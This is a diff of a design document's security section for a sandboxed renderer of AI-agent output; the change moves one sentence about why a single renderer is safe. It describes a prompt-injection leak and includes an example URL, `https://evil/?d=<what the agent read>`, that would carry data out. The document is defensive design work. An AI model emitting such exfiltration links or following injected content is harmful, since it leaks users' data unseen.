@@ -179,8 +179,9 @@ to a machine value would add prompt cost and the framework rule 2 refuses.
 ## 4. Security
 
 **The invariant both share:** nothing in the schema runs code in the window's JavaScript. Blocks are data drawn by the
-window's components. `html` runs in the sandboxed frame (`allow-scripts` only, an opaque origin, no reach into the window's own `superego`,
-messages only through `postMessage` to the host).
+window's components. `html` runs in the sandboxed frame (`allow-scripts` only, an opaque origin, no reach into the
+window's own `superego`, messages only through `postMessage` to the host). This invariant is why one renderer is safe
+for both, and why a remote machine's or a project profile's view needs no consent, as data views need none today.
 
 **Nothing an agent draws reaches the network on its own.** An agent's output is where prompt injection shows: a page
 that fetched `https://evil/?d=<what the agent read>` would leak it with no tool call to see, from a profile with no
@@ -192,8 +193,7 @@ network tools at all. So:
   refresh) is `frame.html`'s `frame-src` to refuse, and its sandbox keeps it from navigating `frame.html` instead.
   (Written into `frame.html` itself, a page could navigate away with what it knows in the address.)
 - An `image` (and any image in a message or a rendered file) on the web shows as a placeholder until the user clicks
-  to load it; a file of the thread's or a `data:` image shows at once. This invariant is why one renderer is safe for both, and why a remote
-machine's or a project profile's view needs no consent, as data views need none today.
+  to load it; a file of the thread's or a `data:` image shows at once.
 
 **An agent's blocks can:**
 - show things
